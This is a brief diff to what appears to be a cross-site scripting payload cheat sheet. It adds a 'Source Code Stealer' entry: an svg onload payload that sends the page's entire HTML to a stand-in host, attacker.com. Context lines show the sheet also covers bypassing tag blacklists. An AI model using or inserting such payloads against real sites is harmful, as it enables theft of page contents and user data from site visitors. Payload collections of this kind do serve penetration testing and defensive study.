@@ -19,6 +19,11 @@ Array.from(document.getElementsByTagName("a")).forEach(function(i) {
 
 ```
 
+**Source Code Stealer**
+```html
+<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
+```
+
 **Bypass tag blacklisting**
 
 ```
